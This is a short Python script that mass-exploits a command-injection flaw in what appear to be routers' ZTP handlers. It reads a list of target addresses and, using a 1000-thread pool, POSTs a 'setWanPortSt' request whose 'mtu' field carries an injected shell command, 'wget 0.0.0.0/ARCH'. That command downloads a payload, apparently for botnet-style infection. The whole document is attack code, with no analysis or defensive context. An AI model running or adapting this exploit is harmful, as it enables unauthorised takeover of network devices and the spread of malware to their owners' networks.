import argparse
import requests
import urllib3
import time
import json
import sys
import vthread
import os
urllib3.disable_warnings()


cmd = "wget 0.0.0.0/ARCH"
@vthread.pool(1000)
def main(url):
    
    if "http" not in url:
        url = "http://" +url
    bash_exploit = ";hiiii;".replace("hiiii",cmd)
    payload = {
        'command': 'setWanPortSt',
        'proto': 'dhcp',
        'port': '1270',
        'vlan_tagged': '1270',
        'vlanid': '1270',
        'mtu': bash_exploit,
        'data':''
    }
    
    headers = { 'Content-Type': 'application/json; charset=utf-8'}
    
    url = url + "/ztp/cgi-bin/handler"
    print("[+] Sending a POST request to " + url)
    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=5)
        
        # we really don't expect a response
        if r.status_code != 503:
            print('[-] Exploitation failed.')
            sys.exit(0)
        else:
            print("SENTTTTT!!!!!!!!!!!!!!")
    except:
        pass


if __name__ == "__main__":


    ip = open(sys.argv[1]).readlines()

    for i in ip:
        main(i)


    
    